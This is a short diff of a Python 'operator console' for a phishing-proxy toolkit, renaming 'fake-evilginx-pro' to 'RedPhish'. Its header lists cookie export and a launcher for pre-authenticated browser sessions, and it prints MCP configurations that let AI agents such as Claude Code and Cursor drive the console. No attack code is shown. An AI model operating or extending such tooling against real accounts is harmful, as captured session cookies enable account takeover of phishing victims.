@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# egconsole.py — THE operator console for fake-evilginx-pro (client-side, Pro-style)
+# egconsole.py — THE operator console for RedPhish (client-side, Pro-style)
 # Combines: egctl (fleet API) + cookie export + session launcher (pre-authenticated
 #           browser) + node ops over SSH (journal tail, puppet)
 #
@@ -71,7 +71,7 @@ def mask(s, keep=3):
 
 class Console(cmd.Cmd):
     intro = (
-        "egconsole — fake-evilginx-pro operator console. 'help' lists commands, "
+        "egconsole — RedPhish operator console. 'help' lists commands, "
         "'use <node>' selects a node, Ctrl+D quits."
     )
     prompt = "eg> "
@@ -381,12 +381,12 @@ class Console(cmd.Cmd):
         print("Agent configurations (fill in your repo path):")
         print()
         print("-- Claude Desktop / Claude Code (stdio, local — no key needed) --")
-        print(json.dumps({"mcpServers": {"fake-evilginx-pro": {
+        print(json.dumps({"mcpServers": {"RedPhish": {
             "command": "python",
             "args": ["<REPO>/tools/mcp/egmcp.py"]}}}, indent=1))
         print()
         print("-- ZCode / Cursor (streamable-http + key) --")
-        print(json.dumps({"mcpServers": {"fake-evilginx-pro": {
+        print(json.dumps({"mcpServers": {"RedPhish": {
             "url": f"http://{host}:8306/mcp",
             "headers": {"X-API-Key": key}}}}, indent=1))
         print()
